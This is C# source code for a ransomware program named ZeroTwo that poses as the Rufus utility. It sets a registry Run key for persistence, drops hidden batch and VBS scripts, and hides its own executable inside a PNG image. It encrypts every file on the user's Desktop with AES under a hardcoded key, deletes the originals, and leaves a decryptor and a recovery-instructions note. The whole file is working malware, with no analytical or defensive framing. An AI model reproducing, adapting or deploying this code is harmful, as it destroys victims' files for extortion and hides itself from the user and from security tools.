using System;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.Diagnostics;
using Microsoft.Win32;
using System.Text;

namespace ZeroTwo.src {
    class ZeroTwo {
        private const string EXT = ".02";

        private const string WORKDIR = "C:\\Updates";
        private const string H_SCR_NAME = "h.vbs";
        private const string PREP_BAT_NAME = "Prep.bat";
        private const string EXEC_BAT_NAME = "Update.bat";
        private const string CLEAR_BAT_NAME = "Clear.bat";
        private const string REG_KEY = "UpdatesHandler";
        private const string EXE_NAME = "WinUpdates";

        private static byte[] k = Encoding.ASCII.GetBytes("abababababababab");
        private static byte[] s = Encoding.ASCII.GetBytes("0202020202020202");

        private const int EXEC_FLAG = 1;

        public static void Main(string[] args) {
            if (args.Length == 0) {
                InjectInReg();
                ExtrRes();
                OpenReal();
            } else if (int.Parse(args[0]) == EXEC_FLAG) {
                Exec();
                ReleaseReverter();
                ReleaseIstructions();
                Clear();
            }
        }

        private static void InjectInReg() {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            key.SetValue(REG_KEY, "wscript " + WORKDIR + "\\" + H_SCR_NAME + " " + WORKDIR + "\\" + EXEC_BAT_NAME);
            key.Close();
        }

        private static void ExtrRes() {
            Directory.CreateDirectory(WORKDIR);
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

            var arcRes = "ZeroTwo.src.arc.arc";
            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(arcRes)) {
                using (var file = new FileStream(WORKDIR + "\\" + "arc.exe", FileMode.Create, FileAccess.Write)) {
                    sfile.CopyTo(file);
                }
            }

            var logoRes = "ZeroTwo.src.img.logo";
            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(logoRes)) {
                using (var file = new FileStream(WORKDIR + "\\" + "logo.png", FileMode.Create, FileAccess.Write)) {
                    sfile.CopyTo(file);
                }
            }

            string hScr = string.Empty;
            hScr += "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False";
            File.WriteAllText(WORKDIR + "\\" + H_SCR_NAME, hScr);

            string execBat = string.Empty;
            execBat += "@ECHO OFF\n";
            execBat += "chdir /d " + WORKDIR + "\n";
            execBat += "rename logo.png logo.rar\n";
            execBat += "arc.exe x -S -ibck logo.rar *.* .\n";
            execBat += EXE_NAME + ".exe " + EXEC_FLAG + "\n";
            execBat += "rename logo.rar logo.png\n";
            execBat += "del " + EXE_NAME + ".exe\n";
            File.WriteAllText(WORKDIR + "\\" + EXEC_BAT_NAME, execBat);

            string prepBat = string.Empty;
            prepBat += "@ECHO OFF\n";
            prepBat += "ping 127.0.0.1 > nul\n";
            prepBat += "echo j | move ";
            prepBat += "\"" + exePath + "\"" + " " + "\"" + WORKDIR + "\\" + EXE_NAME + ".exe" + "\"" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + WORKDIR + "\"" + "\n";
            prepBat += "chdir /d " + WORKDIR + "\n";
            prepBat += "arc.exe a -r " + EXE_NAME + ".rar" + " " + EXE_NAME + ".exe" + "\n";
            prepBat += "copy /b logo.png + " + EXE_NAME + ".rar " + "logo.png" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + "arc.exe" + "\"" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + EXEC_BAT_NAME + "\"" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + H_SCR_NAME + "\"" + "\n";
            prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".exe" + "\"" + "\n";
            prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".rar" + "\"" + "\n";
            prepBat += "echo j | del /F /Q " + "\"" + PREP_BAT_NAME + "\"";
            File.WriteAllText(WORKDIR + "\\" + PREP_BAT_NAME, prepBat);

            Process p = new Process();
            p.StartInfo.FileName = WORKDIR + "\\" + PREP_BAT_NAME;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
        }

        private static void OpenReal() {
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
            int index = exePath.LastIndexOf("/");
            string exeFolder = exePath.Substring(0, index);
            string exeName = Process.GetCurrentProcess().ProcessName;
            string realExePath = (exeFolder + "\\" + exeName + " .exe").Replace("/", "\\");


            if (File.Exists(realExePath))
                File.Delete(realExePath);


            if (!Directory.Exists(Path.GetDirectoryName(realExePath)))
                Directory.CreateDirectory(Path.GetDirectoryName(realExePath));

            var exeRes = "ZeroTwo.src.real.Rufus";
            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(exeRes)) {
                using (var file = new FileStream(realExePath, FileMode.Create, FileAccess.Write)) {
                    sfile.CopyTo(file);
                }
            }

            Process.Start(realExePath);
        }

        private static void Exec() {
            string mainPath = "C:/users/" + Environment.UserName + "/Desktop";
            string[] files = Directory.GetFiles(mainPath, "*.*", SearchOption.AllDirectories);
            foreach (string file in files) {
                if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
                    Enc(file, file + EXT, k);
                }
            }
        }

        private static void Enc(string inputFile, string outputFile, byte[] passwordBytes) {
            byte[] saltBytes = s;
            string cryptFile = outputFile;

            FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;
            AES.Mode = CipherMode.CBC;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fs = new FileStream(inputFile, FileMode.Open);

            int data;
            while ((data = fs.ReadByte()) != -1)
                cs.WriteByte((byte)data);

            fs.Close();
            cs.Close();
            fsCrypt.Close();

            File.Delete(inputFile);
        }

        private static void Clear() {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue(REG_KEY);
            key.Close();

            string clearBat = string.Empty;
            clearBat += "@ECHO OFF\n";
            clearBat += "ping 127.0.0.1 > nul\n";
            clearBat += "echo j | attrib -h -s " + "\"" + WORKDIR + "\\*" + "\"" + "\n";
            clearBat += "echo j | rmdir /S /Q " + "\"" + WORKDIR + "\"" + "\n";
            File.WriteAllText(WORKDIR + "\\" + CLEAR_BAT_NAME, clearBat);

            Process p = new Process();
            p.StartInfo.FileName = WORKDIR + "\\" + CLEAR_BAT_NAME;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
        }

        private static void ReleaseIstructions() {
            var assembly = Assembly.GetExecutingAssembly();
            var instructionsRes = "ZeroTwo.src.txt.Instructions";
            using (Stream stream = assembly.GetManifestResourceStream(instructionsRes))
            using (StreamReader reader = new StreamReader(stream)) {
                string instructions = reader.ReadToEnd();
                string instructionsPath = "C:/users/" + Environment.UserName + "/Desktop/Istruzioni recupero.txt";
                File.WriteAllText(instructionsPath, instructions);
                Process.Start(instructionsPath);
            }
        }

        private static void ReleaseReverter() {
            var revRes = "ZeroTwo.src.rev.02Reverter";
            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(revRes)) {
                using (var file = new FileStream("C:/users/" + Environment.UserName + "/Desktop/02Reverter.exe", FileMode.Create, FileAccess.Write)) {
                    sfile.CopyTo(file);
                }
            }
        }
    }
}
